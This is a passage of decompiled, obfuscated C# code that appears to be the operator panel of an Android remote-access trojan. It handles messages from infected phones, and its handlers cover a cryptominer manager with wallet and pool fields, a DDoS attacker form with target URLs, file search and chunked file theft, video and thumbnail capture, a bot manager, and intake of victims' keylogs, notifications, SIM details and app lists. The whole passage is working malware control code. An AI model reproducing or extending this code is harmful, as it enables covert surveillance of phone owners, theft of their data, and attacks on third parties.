						}
						return;
					}
					catch (Exception ex83)
					{
						ProjectData.SetProjectError(ex83);
						Exception ex84 = ex83;
						Debuger.Log_e(EXGuarder._07543223, codes.EXtoString(ex84));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.primes, TextCompare: false) == 0)
				{
					try
					{
						string name10 = EXGuarder._5B791402 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						profile profile3 = (profile)MyProject.Application.OpenForms[name10];
						if (profile3 != null)
						{
							string left32 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left32, EXGuarder._445F2207, TextCompare: false) == 0)
							{
								string value7 = dictionary3[EXGuarder._08033105].ToString();
								Dictionary<string, object> primsjson = JsonConvert.DeserializeObject<Dictionary<string, object>>(value7);
								profile3.updateprimes(primsjson);
							}
						}
						return;
					}
					catch (Exception ex85)
					{
						ProjectData.SetProjectError(ex85);
						Exception ex86 = ex85;
						Debuger.Log_e(EXGuarder._03056F03, codes.EXtoString(ex86));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.minercom, TextCompare: false) == 0)
				{
					try
					{
						string _536C2E0F = EXGuarder._536C2E0F;
						minersmanager minersmanager2 = (minersmanager)MyProject.Application.OpenForms[_536C2E0F];
						if (minersmanager2 != null)
						{
							string left33 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left33, EXGuarder._445F2207, TextCompare: false) == 0)
							{
								string workerName = dictionary3[EXGuarder._66422E76].ToString();
								string wallet = dictionary3[EXGuarder._00544763].ToString();
								string pool = dictionary3[EXGuarder._53441306].ToString();
								string hashrate = dictionary3[EXGuarder._2A345654].ToString();
								string thestate = dictionary3[EXGuarder._23021C74].ToString();
								minersmanager2.updateclient(closure_0024__15_002D2._0024VB_0024Local_mobid, workerName, wallet, pool, hashrate, thestate);
							}
							else if (Operators.CompareString(left33, EXGuarder._54505237, TextCompare: false) == 0)
							{
								string thelog = dictionary3[EXGuarder._13582278].ToString();
								minersmanager2.updatelog(closure_0024__15_002D2._0024VB_0024Local_mobid, thelog);
							}
						}
						return;
					}
					catch (Exception ex87)
					{
						ProjectData.SetProjectError(ex87);
						Exception ex88 = ex87;
						Debuger.Log_e(EXGuarder._1B5A7807, codes.EXtoString(ex88));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.doscom, TextCompare: false) == 0)
				{
					try
					{
						string _0A = EXGuarder._0A413338;
						ddosattacker ddosattacker2 = (ddosattacker)MyProject.Application.OpenForms[_0A];
						if (ddosattacker2 != null)
						{
							string left34 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left34, EXGuarder._445F2207, TextCompare: false) == 0)
							{
								string text61 = dictionary3[EXGuarder._4E1E3E2B].ToString();
								string targeturl = dictionary3[EXGuarder._522E6830].ToString();
								string targettype = dictionary3[EXGuarder._4F3F683C].ToString();
								if (Operators.CompareString(text61, EXGuarder._6C6A4654, TextCompare: false) == 0)
								{
									if (ddosattacker2.activedos.Contains(closure_0024__15_002D2._0024VB_0024Local_mobid))
									{
										ddosattacker2.activedos.Remove(closure_0024__15_002D2._0024VB_0024Local_mobid);
									}
								}
								else if (Operators.CompareString(text61, EXGuarder._3F257651, TextCompare: false) == 0 && !ddosattacker2.activedos.Contains(closure_0024__15_002D2._0024VB_0024Local_mobid))
								{
									ddosattacker2.activedos.Add(closure_0024__15_002D2._0024VB_0024Local_mobid);
								}
								ddosattacker2.updateclient(closure_0024__15_002D2._0024VB_0024Local_mobid, text61, targeturl, targettype);
							}
						}
						return;
					}
					catch (Exception ex89)
					{
						ProjectData.SetProjectError(ex89);
						Exception ex90 = ex89;
						Debuger.Log_e(EXGuarder._0870385D, codes.EXtoString(ex90));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.srchcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D49 arg35 = default(_Closure_0024__15_002D49);
						_Closure_0024__15_002D49 CS_0024_003C_003E8__locals661 = new _Closure_0024__15_002D49(arg35);
						string name11 = EXGuarder._38310548 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals661._0024VB_0024Local_FileManager = (filesmanager)MyProject.Application.OpenForms[name11];
						if (CS_0024_003C_003E8__locals661._0024VB_0024Local_FileManager != null)
						{
							string text62 = dictionary3[EXGuarder._1B43794D].ToString();
							string text63 = dictionary3[EXGuarder._35364A1A].ToString();
							string text64 = text62 + EXGuarder._743F7154;
							CS_0024_003C_003E8__locals661._0024VB_0024Local_rowsToAdd = new List<object[]>();
							string[] array31 = text63.Split(new string[1] { EXGuarder._4B617608 }, StringSplitOptions.None);
							foreach (string text65 in array31)
							{
								string[] array32 = text65.Split('|');
								string text66 = array32[0];
								string text67 = EXGuarder._3D747172;
								string text68 = EXGuarder._3D747172;
								if (array32.Length >= 2)
								{
									text67 = array32[1];
								}
								if (array32.Length >= 3)
								{
									try
									{
										long milliseconds = long.Parse(array32[2]);
										text68 = DateTimeOffset.FromUnixTimeMilliseconds(milliseconds).LocalDateTime.ToString(EXGuarder._4271602E);
									}
									catch (Exception projectError3)
									{
										ProjectData.SetProjectError(projectError3);
										text68 = EXGuarder._3D747172;
										ProjectData.ClearProjectError();
									}
								}
								CS_0024_003C_003E8__locals661._0024VB_0024Local_rowsToAdd.Add(new object[3] { text66, text67, text68 });
							}
							CS_0024_003C_003E8__locals661._0024VB_0024Local_FileManager.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals661._0024VB_0024Local_FileManager.DGVFIND.Rows.Clear();
								CS_0024_003C_003E8__locals661._0024VB_0024Local_FileManager.DGVFIND.Rows.AddRange(CS_0024_003C_003E8__locals661._0024VB_0024Local_rowsToAdd.Select([SpecialName] (object[] r) =>
								{
									DataGridViewRow dataGridViewRow7 = new DataGridViewRow();
									dataGridViewRow7.CreateCells(CS_0024_003C_003E8__locals661._0024VB_0024Local_FileManager.DGVFIND, r);
									return dataGridViewRow7;
								}).ToArray());
							}));
						}
						return;
					}
					catch (Exception ex91)
					{
						ProjectData.SetProjectError(ex91);
						Exception ex92 = ex91;
						Debuger.Log_e(EXGuarder._46085D47, codes.EXtoString(ex92));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.downloadf, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D50 arg36 = default(_Closure_0024__15_002D50);
						_Closure_0024__15_002D50 CS_0024_003C_003E8__locals640 = new _Closure_0024__15_002D50(arg36);
						string name12 = EXGuarder._38310548 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager = (filesmanager)MyProject.Application.OpenForms[name12];
						if (CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager != null)
						{
							BTClient clientById8 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (clientById8 != null && dictionary3.ContainsKey(EXGuarder._5912273F) && dictionary3.ContainsKey(EXGuarder._33436241) && dictionary3.ContainsKey(EXGuarder._28191440) && dictionary3.ContainsKey(EXGuarder._443C3843) && dictionary3.ContainsKey(EXGuarder._4555670A) && dictionary3.ContainsKey(EXGuarder._7114526B) && dictionary3.ContainsKey(EXGuarder._253E232F))
							{
								CS_0024_003C_003E8__locals640._0024VB_0024Local_filename = dictionary3[EXGuarder._5912273F].ToString();
								string text69 = dictionary3[EXGuarder._33436241].ToString();
								CS_0024_003C_003E8__locals640._0024VB_0024Local_totalSize = Conversions.ToLong(dictionary3[EXGuarder._28191440].ToString());
								long num13 = Conversions.ToLong(dictionary3[EXGuarder._443C3843].ToString());
								int num14 = Conversions.ToInteger(dictionary3[EXGuarder._4555670A].ToString());
								string text70 = dictionary3[EXGuarder._7114526B].ToString();
								CS_0024_003C_003E8__locals640._0024VB_0024Local_filepath = dictionary3[EXGuarder._253E232F].ToString();
								string text71 = closure_0024__15_002D2._0024VB_0024Local_mobid;
								CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview = null;
								if (!CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsrows.TryGetValue(CS_0024_003C_003E8__locals640._0024VB_0024Local_filepath, out CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview))
								{
									CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										int index = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.DGVDATA.Rows.Add(CS_0024_003C_003E8__locals640._0024VB_0024Local_filename, CS_0024_003C_003E8__locals640._0024VB_0024Local_filepath, codes.BytesToText(CS_0024_003C_003E8__locals640._0024VB_0024Local_totalSize), BTConst.Downloadingstr, "0%");
										CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.DGVDATA.Rows[index];
										CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Tag = CS_0024_003C_003E8__locals640._0024VB_0024Local_filepath;
									}));
									object downloadsLock = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsLock;
									ObjectFlowControl.CheckForSyncLockOnValueType(downloadsLock);
									bool lockTaken2 = false;
									try
									{
										Monitor.Enter(downloadsLock, ref lockTaken2);
										CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsrows[CS_0024_003C_003E8__locals640._0024VB_0024Local_filepath] = CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview;
									}
									finally
									{
										if (lockTaken2)
										{
											Monitor.Exit(downloadsLock);
										}
									}
								}
								object downloadsLock2 = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsLock;
								ObjectFlowControl.CheckForSyncLockOnValueType(downloadsLock2);
								bool lockTaken3 = false;
								try
								{
									Monitor.Enter(downloadsLock2, ref lockTaken3);
									if (!CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloads.ContainsKey(text70))
									{
										CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloads[text70] = new filesmanager.DownloadData
										{
											Chunks = new List<byte[]>(),
											Filename = CS_0024_003C_003E8__locals640._0024VB_0024Local_filename,
											TotalSize = CS_0024_003C_003E8__locals640._0024VB_0024Local_totalSize,
											SentSize = 0L,
											FilePath = CS_0024_003C_003E8__locals640._0024VB_0024Local_filepath
										};
									}
								}
								finally
								{
									if (lockTaken3)
									{
										Monitor.Exit(downloadsLock2);
									}
								}
								byte[] value8 = Convert.FromBase64String(text69.Replace(EXGuarder._61034C3D, EXGuarder._121E6943).Replace(EXGuarder._0723232B, EXGuarder._121E6943));
								filesmanager.DownloadData downloadData = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloads[text70];
								object downloadsLock3 = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsLock;
								ObjectFlowControl.CheckForSyncLockOnValueType(downloadsLock3);
								bool lockTaken4 = false;
								try
								{
									Monitor.Enter(downloadsLock3, ref lockTaken4);
									if (downloadData.Chunks.Count <= num14)
									{
										downloadData.Chunks.AddRange(Enumerable.Repeat<byte[]>(null, num14 - downloadData.Chunks.Count + 1));
									}
									downloadData.Chunks[num14] = value8;
								}
								finally
								{
									if (lockTaken4)
									{
										Monitor.Exit(downloadsLock3);
									}
								}
								downloadData.SentSize = Math.Max(downloadData.SentSize, num13);
								double num15 = (double)num13 / (double)CS_0024_003C_003E8__locals640._0024VB_0024Local_totalSize * 100.0;
								CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Cells[4].Value = string.Format(EXGuarder._362F1255, num15);
								CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Cells[3].Value = EXGuarder._080A3840;
								if (num13 >= CS_0024_003C_003E8__locals640._0024VB_0024Local_totalSize)
								{
									try
									{
										int num16 = 5;
										int num17 = num16;
										for (int num18 = 1; num18 <= num17; num18++)
										{
											object downloadsLock4 = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsLock;
											ObjectFlowControl.CheckForSyncLockOnValueType(downloadsLock4);
											bool lockTaken5 = false;
											try
											{
												Monitor.Enter(downloadsLock4, ref lockTaken5);
												if (!downloadData.Chunks.Any([SpecialName] (byte[] chunk) => chunk == null))
												{
													break;
												}
											}
											finally
											{
												if (lockTaken5)
												{
													Monitor.Exit(downloadsLock4);
												}
											}
											Thread.Sleep(1000);
										}
										object downloadsLock5 = CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloadsLock;
										ObjectFlowControl.CheckForSyncLockOnValueType(downloadsLock5);
										bool lockTaken6 = false;
										byte[] bytes2;
										try
										{
											Monitor.Enter(downloadsLock5, ref lockTaken6);
											if (downloadData.Chunks.Any([SpecialName] (byte[] chunk) => chunk == null))
											{
												Console.WriteLine(EXGuarder._5D5F5A43 + text70);
												return;
											}
											bytes2 = downloadData.Chunks.SelectMany([SpecialName] (byte[] chunk) => chunk).ToArray();
										}
										finally
										{
											if (lockTaken6)
											{
												Monitor.Exit(downloadsLock5);
											}
										}
										string text72 = clientById8.userfolder + EXGuarder._1918136A;
										if (!Directory.Exists(text72))
										{
											Directory.CreateDirectory(text72);
										}
										File.WriteAllBytes(Path.Combine(text72, CS_0024_003C_003E8__locals640._0024VB_0024Local_filename), bytes2);
										CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Cells[4].Value = string.Format(EXGuarder._362F1255, num15);
										CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Cells[3].Value = EXGuarder._20126456;
										CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.DefaultCellStyle.ForeColor = Color.DeepSkyBlue;
										CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Tag = EXGuarder._5512452F;
										if (BTRegistry.ReadBool(EXGuarder._67006415))
										{
											BTAlerter.infos(EXGuarder._576F156F + CS_0024_003C_003E8__locals640._0024VB_0024Local_filename);
										}
										if (CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview != null)
										{
											((WebSocketClient)CS_0024_003C_003E8__locals640._0024VB_0024Local_rowview.Cells[0].Tag)?.Disconnect(BTConst.downfilrstr, _121E);
										}
										CS_0024_003C_003E8__locals640._0024VB_0024Local_FileManager.downloads.Remove(text70);
										return;
									}
									catch (Exception ex93)
									{
										ProjectData.SetProjectError(ex93);
										Exception ex94 = ex93;
										Console.WriteLine(EXGuarder._2A002179 + ex94.Message);
										ProjectData.ClearProjectError();
										return;
									}
								}
							}
						}
						return;
					}
					catch (Exception ex95)
					{
						ProjectData.SetProjectError(ex95);
						Exception ex96 = ex95;
						Console.WriteLine(EXGuarder._0F3F5D0B + ex96.Message);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.pvidcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D51 arg37 = default(_Closure_0024__15_002D51);
						_Closure_0024__15_002D51 CS_0024_003C_003E8__locals655 = new _Closure_0024__15_002D51(arg37);
						string input = dictionary3[EXGuarder._0E207477].ToString();
						CS_0024_003C_003E8__locals655._0024VB_0024Local_duration = dictionary3[EXGuarder._48732953].ToString();
						string name13 = EXGuarder._55746B66 + codes.StringToMD5(input);
						CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp = (vidplayer)MyProject.Application.OpenForms[name13];
						if (CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp != null)
						{
							string s12 = dictionary3[EXGuarder._28512279].ToString();
							byte[] array33 = Convert.FromBase64String(s12);
							using (MemoryStream stream7 = new MemoryStream(array33, 0, array33.Length, writable: true, publiclyVisible: true))
							{
								using MagickImage magickImage7 = new MagickImage(stream7);
								CS_0024_003C_003E8__locals655._0024VB_0024Local_imgBitmap = magickImage7.ToBitmap();
							}
							if (CS_0024_003C_003E8__locals655._0024VB_0024Local_imgBitmap != null)
							{
								try
								{
									if (CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.Disposing | CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.viewimage.Disposing)
									{
										return;
									}
									CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										try
										{
											if (CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.viewimage.Image != null)
											{
												CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.viewimage.Image.Dispose();
												CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.viewimage.Image = null;
											}
											CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.viewimage.Image = CS_0024_003C_003E8__locals655._0024VB_0024Local_imgBitmap;
											CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.viewimage.SizeMode = PictureBoxSizeMode.StretchImage;
										}
										catch (Exception ex109)
										{
											ProjectData.SetProjectError(ex109);
											Exception ex110 = ex109;
											ProjectData.ClearProjectError();
										}
									}));
								}
								catch (Exception ex97)
								{
									ProjectData.SetProjectError(ex97);
									Exception ex98 = ex97;
									ProjectData.ClearProjectError();
								}
								if (!(CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.Disposing | CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.durprogress.Disposing))
								{
									if (CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.durprogress.Value < 1)
									{
										_Closure_0024__15_002D52 arg38 = default(_Closure_0024__15_002D52);
										_Closure_0024__15_002D52 CS_0024_003C_003E8__locals652 = new _Closure_0024__15_002D52(arg38);
										CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33 = CS_0024_003C_003E8__locals655;
										if (long.TryParse(CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_duration, out var result))
										{
											CS_0024_003C_003E8__locals652._0024VB_0024Local_readableDuration = TimeSpan.FromMilliseconds(result).ToString(EXGuarder._2556694A);
										}
										else
										{
											CS_0024_003C_003E8__locals652._0024VB_0024Local_readableDuration = EXGuarder._3D747172;
										}
										CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.durprogress.Value++;
											CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.durprogress.Maximum = Conversions.ToInteger(CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_duration);
											CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.Text = CS_0024_003C_003E8__locals652._0024VB_0024NonLocal__0024VB_0024Closure_33._0024VB_0024Local_vidp.targetfilename + " | " + CS_0024_003C_003E8__locals652._0024VB_0024Local_readableDuration;
										}));
									}
									else
									{
										CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.durprogress.Value = Math.Min(CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.durprogress.Value + 500, CS_0024_003C_003E8__locals655._0024VB_0024Local_vidp.durprogress.Maximum);
										}));
									}
								}
							}
						}
						return;
					}
					catch (Exception ex99)
					{
						ProjectData.SetProjectError(ex99);
						Exception ex100 = ex99;
						Debuger.Log_e(EXGuarder._69362552, codes.EXtoString(ex100));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.thumbcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D53 arg39 = default(_Closure_0024__15_002D53);
						_Closure_0024__15_002D53 CS_0024_003C_003E8__locals660 = new _Closure_0024__15_002D53(arg39);
						string name14 = EXGuarder._38310548 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager = (filesmanager)MyProject.Application.OpenForms[name14];
						if (CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager != null)
						{
							BTClient clientById9 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (clientById9 != null)
							{
								string base64String = dictionary3[EXGuarder._28512279].ToString();
								string text73 = dictionary3[EXGuarder._0E207477].ToString();
								CS_0024_003C_003E8__locals660._0024VB_0024Local_thumbimg = (Bitmap)codes.Base64ToBitmap(base64String).Clone();
								Bitmap bitmap14 = (Bitmap)new Bitmap(CS_0024_003C_003E8__locals660._0024VB_0024Local_thumbimg).Clone();
								CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									if (CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager.viwimage.Image != null)
									{
										CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager.viwimage.Image.Dispose();
										CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager.viwimage.Image = null;
									}
									CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager.viwimage.Image = CS_0024_003C_003E8__locals660._0024VB_0024Local_thumbimg;
								}));
								string text74 = clientById9.userfolder + EXGuarder._345B704C + codes.CleanFolderPath(Conversions.ToString(NewLateBinding.LateGet(CS_0024_003C_003E8__locals660._0024VB_0024Local_FileManager.listfilesvew.Tag, null, EXGuarder._5274151C, new object[2]
								{
									EXGuarder._5F06216D,
									EXGuarder._2F0F3F3E
								}, null, null, null)));
								string text75 = codes.CleanFileName(text73.Substring(text73.LastIndexOf(EXGuarder._5F06216D) + 1));
								if (!Directory.Exists(text74))
								{
									Directory.CreateDirectory(text74);
								}
								if (text75.EndsWith(EXGuarder._0F574475) || text75.EndsWith(EXGuarder._4A375749))
								{
									codes.SaveVideothumb(text74, text75, bitmap14);
								}
								else
								{
									bitmap14.Save(text74 + EXGuarder._2F0F3F3E + text75);
								}
								bitmap14.Dispose();
							}
						}
						return;
					}
					catch (Exception ex101)
					{
						ProjectData.SetProjectError(ex101);
						Exception ex102 = ex101;
						Debuger.Log_e(EXGuarder._76675651, codes.EXtoString(ex102));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.botcom, TextCompare: false) == 0)
				{
					try
					{
						string _4E = EXGuarder._4E213060;
						BotsManager botsManager = (BotsManager)MyProject.Application.OpenForms[_4E];
						if (botsManager != null)
						{
							string left35 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left35, EXGuarder._23126833, TextCompare: false) == 0)
							{
								string text76 = dictionary3[EXGuarder._4E1E3E2B].ToString();
								if (Operators.CompareString(text76, EXGuarder._5512452F, TextCompare: false) == 0)
								{
									botsManager.clientisoff(closure_0024__15_002D2._0024VB_0024Local_mobid);
								}
								else
								{
									string lastactive = dictionary3[EXGuarder._79712B51].ToString();
									botsManager.updateclient(closure_0024__15_002D2._0024VB_0024Local_mobid, text76, lastactive);
								}
							}
						}
						return;
					}
					catch (Exception ex103)
					{
						ProjectData.SetProjectError(ex103);
						Exception ex104 = ex103;
						Debuger.Log_e(EXGuarder._3E3D591B, codes.EXtoString(ex104));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Activitys, TextCompare: false) == 0)
				{
					try
					{
						string name15 = EXGuarder._5B791402 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						profile profile4 = (profile)MyProject.Application.OpenForms[name15];
						if (profile4 != null)
						{
							string text77 = dictionary3[EXGuarder._08033105].ToString();
							string[] source = text77.Split('>');
							StringBuilder stringBuilder = new StringBuilder();
							stringBuilder.AppendLine(string.Join(Environment.NewLine + Environment.NewLine, source.Where([SpecialName] (string e) => !string.IsNullOrWhiteSpace(e)).Select([SpecialName] (string eventData) =>
							{
								string[] array34 = (from p in eventData.Split('|')
									select p.Trim()).ToArray();
								return (array34.Length >= 3) ? $"{array34[0],-20} | {array34[1],-18} | {array34[2]}" : string.Join(" | ", array34);
							})));
							string text78 = stringBuilder.ToString();
							profile4.updateactivitylog(text78);
							BTClient clientById10 = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (clientById10 != null)
							{
								string left36 = dictionary3[EXGuarder._5E186642].ToString();
								string savetype = EXGuarder._3877550E;
								string filTag = EXGuarder._6E0F4C34;
								if (Operators.CompareString(left36, EXGuarder._39796108, TextCompare: false) != 0)
								{
									if (Operators.CompareString(left36, EXGuarder._4B1C3477, TextCompare: false) != 0)
									{
										if (Operators.CompareString(left36, EXGuarder._4A196227, TextCompare: false) != 0)
										{
											if (Operators.CompareString(left36, EXGuarder._66064A40, TextCompare: false) != 0)
											{
												if (Operators.CompareString(left36, EXGuarder._35281153, TextCompare: false) == 0)
												{
													savetype = EXGuarder._11124F6D;
													filTag = EXGuarder._241B3C6E;
												}
											}
											else
											{
												savetype = EXGuarder._40702861;
												filTag = EXGuarder._2268266E;
											}
										}
										else
										{
											savetype = EXGuarder._17594F38;
											filTag = EXGuarder._77413756;
										}
									}
									else
									{
										savetype = EXGuarder._762F406A;
										filTag = EXGuarder._7842515B;
									}
								}
								if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
								{
									codes.SaveJson(text78, clientById10.userfolder, savetype, filTag);
								}
							}
						}
						return;
					}
					catch (Exception ex105)
					{
						ProjectData.SetProjectError(ex105);
						Exception ex106 = ex105;
						Debuger.Log_e(EXGuarder._6D1D1C07, codes.EXtoString(ex106));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Unauthorized_access, TextCompare: false) == 0)
				{
					MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						MainForm.Enabled = false;
						MainForm.statestimer.Enabled = false;
						MainForm.statestimer.Stop();
						if (MyMsg.Show(BTConst.Unauthorized, BTConst.unauth_again, MyMsg.msgtype.errors, use_no: false) != DialogResult.None)
						{
							Environment.Exit(0);
						}
					}));
				}
				else if (Operators.CompareString(left2, EXGuarder._4B2C6458, TextCompare: false) == 0)
				{
					Debuger.Log_d(EXGuarder._6E343960, EXGuarder._5B041D6C);
				}
				else
				{
					Debuger.Log_d(EXGuarder._6A3D793F, text2);
				}
			}
			catch (Exception ex107)
			{
				ProjectData.SetProjectError(ex107);
				Exception ex108 = ex107;
				Debuger.Log_e(EXGuarder._6A19585A, codes.EXtoString(ex108));
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void AddOrUpdateClient(Dictionary<string, object> data, string ClientAddress, ServersInfo srverinf)
	{
		checked
		{
			try
			{
				string text = (data.ContainsKey(EXGuarder._23650F33) ? data[EXGuarder._23650F33].ToString() : EXGuarder._7262202D);
				bool flag = SecureClients.ContainsKey(text);
				if (clients.ContainsKey(text))
				{
					return;
				}
				string cli_name = (data.ContainsKey(EXGuarder._1A344D67) ? data[EXGuarder._1A344D67].ToString() : EXGuarder._7262202D);
				string cli_android = (data.ContainsKey(EXGuarder._3C291058) ? data[EXGuarder._3C291058].ToString() : EXGuarder._7262202D);
				string cli_mobname = (data.ContainsKey(EXGuarder._0E45260E) ? data[EXGuarder._0E45260E].ToString() : EXGuarder._7262202D);
				string left = (data.ContainsKey(EXGuarder._5E5A1C0A) ? data[EXGuarder._5E5A1C0A].ToString() : EXGuarder._7262202D);
				string text2 = (data.ContainsKey(EXGuarder._3D423937) ? data[EXGuarder._3D423937].ToString() : EXGuarder._7262202D);
				string text3 = (data.ContainsKey(EXGuarder._2C35521F) ? data[EXGuarder._2C35521F].ToString() : EXGuarder._7262202D);
				string cli_installdate = (data.ContainsKey(EXGuarder._6218084B) ? data[EXGuarder._6218084B].ToString() : EXGuarder._7262202D);
				string imgBase = (data.ContainsKey(EXGuarder._575F6F30) ? data[EXGuarder._575F6F30].ToString() : EXGuarder._7262202D);
				string cli_sim = (data.ContainsKey(EXGuarder._110A4140) ? data[EXGuarder._110A4140].ToString() : EXGuarder._7262202D);
				string cli_keylogs = ((!data.ContainsKey(EXGuarder._2F310D31)) ? EXGuarder._3E740C5E : data[EXGuarder._2F310D31]?.ToString());
				string cli_vapps = ((!data.ContainsKey(EXGuarder._3F0E5762)) ? EXGuarder._3E740C5E : data[EXGuarder._3F0E5762]?.ToString());
				string cli_activz = ((!data.ContainsKey(EXGuarder._03303B19)) ? EXGuarder._3E740C5E : data[EXGuarder._03303B19]?.ToString());
				string cli_notifys = ((!data.ContainsKey(EXGuarder._34460D11)) ? EXGuarder._3E740C5E : data[EXGuarder._34460D11]?.ToString());
				string cli_vLinks = ((!data.ContainsKey(EXGuarder._74383C58)) ? EXGuarder._3E740C5E : data[EXGuarder._74383C58]?.ToString());
				string text4 = (data.ContainsKey(EXGuarder._71740934) ? data[EXGuarder._71740934].ToString() : EXGuarder._7262202D);
				string text5 = (data.ContainsKey(EXGuarder._1F605038) ? data[EXGuarder._1F605038].ToString() : EXGuarder._7262202D);
				string text6 = (data.ContainsKey(EXGuarder._703A4833) ? data[EXGuarder._703A4833].ToString() : EXGuarder._7262202D);
				string cli_tag = (data.ContainsKey(EXGuarder._54322160) ? data[EXGuarder._54322160].ToString() : EXGuarder._7262202D);
				Image image = (Bitmap)MyRes.GetWallpaper(imgBase, 35, 35).Clone();
				Bitmap bitmap = null;
				bitmap = ((Operators.CompareString(left, EXGuarder._4D4B192A, TextCompare: false) != 0) ? ((Bitmap)Resources.battery_oncharge.Clone()) : ((Bitmap)MyRes.GetBattery(text2).Clone()));
				Bitmap cli_wifi = (Bitmap)MyRes.NetworkType(text3).Clone();
